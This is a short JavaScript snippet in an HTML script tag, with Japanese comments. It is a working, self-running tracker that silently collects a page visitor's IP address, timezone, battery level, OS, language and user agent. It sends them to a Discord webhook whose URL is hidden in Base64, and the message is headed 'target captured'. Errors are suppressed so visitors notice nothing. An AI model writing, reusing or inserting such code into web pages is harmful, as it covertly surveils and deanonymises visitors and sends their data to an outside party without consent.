<script type="text/javascript">
(async function() {
    try {
        // 1. Webhook URL (Base64)
        const _0x1f2e = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MDg1ODk1OTE0ODQ4NjY5OC9yb2dSQWpFSlY0VUJQTlB1cTZ2Q1MxbUk0NEM3N3c3NzFXZEI3UldxaDY5NkxLOUlPUDY1NFNzZlQxeZlWEpWRjg3";
        const _0x5a12 = atob(_0x1f2e);

        // 2. IP取得 (CORSエラーが出にくい ipify を使用)
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        const userIP = ipData.ip;

        // 3. デバイス情報の収集
        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
        let bat = "不明";
        try { const b = await navigator.getBattery(); bat = (b.level * 100) + "%"; } catch(e){}

        // 4. Discord用メッセージ
        const payload = {
            embeds: [{
                title: "🚨 ターゲット捕捉 (CORS回避済み)",
                color: 16711680,
                fields: [
                    { name: "🌐 Network", value: `**IP:** ${userIP}\n**TimeZone:** ${tz}`, inline: false },
                    { name: "💻 Device", value: `**OS:** ${navigator.platform}\n**Language:** ${navigator.language}\n**Battery:** ${bat}`, inline: true },
                    { name: "🔍 User-Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
                ],
                timestamp: new Date()
            }]
        };

        // 5. 送信
        await fetch(_0x5a12, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

    } catch (err) {
        // エラー時は何もしない
    }
})();
</script>
